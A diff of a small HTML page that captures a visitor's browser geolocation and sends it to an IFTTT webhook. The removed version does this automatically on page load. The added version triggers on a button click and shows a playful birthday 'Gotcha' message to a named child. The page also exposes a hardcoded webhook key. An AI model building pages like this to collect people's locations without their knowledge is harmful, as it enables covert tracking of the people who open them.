@@ -1,48 +1,193 @@
 <!DOCTYPE html>
-<html>
-<head>
-    <title>Get Location</title>
-</head>
-<body>
-    <h1>Location Access Page</h1>
-    <p>Click "Allow" to proceed.</p>
-    <script>
-        function sendLocation(latitude, longitude) {
-            const webhookURL = "https://maker.ifttt.com/trigger/Location_update/with/key/ddLkMioRn0CIWb9G_YlQFE";
-            const data = {
-                value1: latitude,
-                value2: longitude,
-                value3: new Date().toISOString()
-            };
+<html lang="en">
 
-            fetch(webhookURL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => console.log("Location sent successfully!"))
-            .catch(error => console.error("Error sending location:", error));
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Click Allow to Proceed</title>
+
+    <style>
+        /* General body styling */
+        body {
+            font-family: 'Helvetica Neue', sans-serif;
+            background-color: #f8f9fa;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+            text-align: center;
+            padding: 20px;
         }
 
-        function getLocation() {
+        /* Heading styling */
+        h1 {
+            font-size: 2.5rem;
+            color: #1abc9c;
+            margin-bottom: 30px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: 600;
+        }
+
+        /* Message before clicking */
+        #message {
+            font-size: 1.4rem;
+            color: #34495e;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        /* Button styling */
+        button {
+            background-color: #8e44ad;
+            color: white;
+            border: none;
+            padding: 16px 30px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            border-radius: 50px;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Button hover effect */
+        button:hover {
+            background-color: #9b59b6;
+            transform: scale(1.05);
+        }
+
+        /* Loading message */
+        #loading {
+            font-size: 1.2rem;
+            color: #f39c12;
+            display: none;
+            font-weight: 500;
+        }
+
+        /* Bold message after location capture */
+        .bold-message {
+            font-size: 1.6rem;
+            font-weight: bold;
+            color: #e74c3c;
+            background-color: #f7dc6f;
+            margin-top: 30px;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0px 8px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 80%;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        /* Location info styling */
+        #location-info {
+            font-size: 1.3rem;
+            color: #34495e;
+            margin-top: 20px;
+        }
+
+        /* Error message styling */
+        .error {
+            color: #e74c3c;
+            font-size: 1.2rem;
+            margin-top: 20px;
+            font-weight: 500;
+        }
+
+        /* Success message styling */
+        .success {
+            color: #27ae60;
+            font-size: 1.3rem;
+            margin-top: 20px;
+            font-weight: 500;
+        }
+    </style>
+</head>
+
+<body>
+
+    <h1>Simphiwe, click the damn button!!!</h1>
+    <p id="message">Please click the button below to allow access to your location.</p>
+    <button onclick="captureLocation()">Allow Location</button>
+    <p id="loading">Getting your location...</p>
+
+    <p id="location-info"></p>
+    <p class="error" id="error-message"></p>
+    <p class="success" id="success-message"></p>
+
+    <div id="gotcha-message" class="bold-message" style="display: none;">
+        <p>Gotcha Simphiwe!!, I finally have your location lol XD.</p>
+        <p>Ohh and another thing, Happy Birthday! Have an amazing day today and always know that daddy loves you! <3</p>
+    </div>
+
+    <script>
+        // Your IFTTT Webhook URL (Update with your IFTTT key)
+        const iftttWebhookUrl = "https://maker.ifttt.com/trigger/Location_update/with/key/ddLkMioRn0CIWb9G_YlQFE";
+
+        // Function to capture the location data
+        function captureLocation() {
+            document.getElementById("loading").style.display = "block"; // Show loading message
+            document.getElementById("message").style.display = "none"; // Hide instruction message
+            document.getElementById("error-message").textContent = ""; // Clear previous errors
+            document.getElementById("location-info").textContent = ""; // Clear previous location data
+
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        sendLocation(latitude, longitude);
-                    },
-                    (error) => console.error("Error getting location:", error)
-                );
+                navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError);
             } else {
-                console.error("Geolocation is not supported by this browser.");
+                alert("Geolocation is not supported by this browser.");
+                document.getElementById("loading").style.display = "none"; // Hide loading message
             }
         }
 
-        // Automatically get location on page load
-        getLocation();
+        // Function to send the location data to IFTTT
+        function sendLocationData(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            // Prepare the URL with parameters to send to IFTTT
+            const url = `${iftttWebhookUrl}?value1=${encodeURIComponent(lat)}&value2=${encodeURIComponent(lon)}&value3=${encodeURIComponent(new Date().toISOString())}`;
+
+            // Send the data using fetch
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById("loading").style.display = "none"; // Hide loading message
+                    document.getElementById("success-message").textContent = "Location sent to IFTTT successfully!";
+                    document.getElementById("location-info").textContent = `Latitude: ${lat}, Longitude: ${lon}`;
+                    document.getElementById("gotcha-message").style.display = "block"; // Show Gotcha message
+                })
+                .catch(error => {
+                    document.getElementById("loading").style.display = "none"; // Hide loading message
+                    document.getElementById("error-message").textContent = "Error sending location data to IFTTT.";
+                    console.error("Error sending location data to IFTTT:", error);
+                });
+        }
+
+        // Error handler for geolocation issues
+        function handleLocationError(error) {
+            document.getElementById("loading").style.display = "none"; // Hide loading message
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    document.getElementById("error-message").textContent = "User denied the request for Geolocation.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    document.getElementById("error-message").textContent = "Location information is unavailable.";
+                    break;
+                case error.TIMEOUT:
+                    document.getElementById("error-message").textContent = "The request to get user location timed out.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    document.getElementById("error-message").textContent = "An unknown error occurred.";
+                    break;
+            }
+        }
     </script>
+
 </body>
+
 </html>
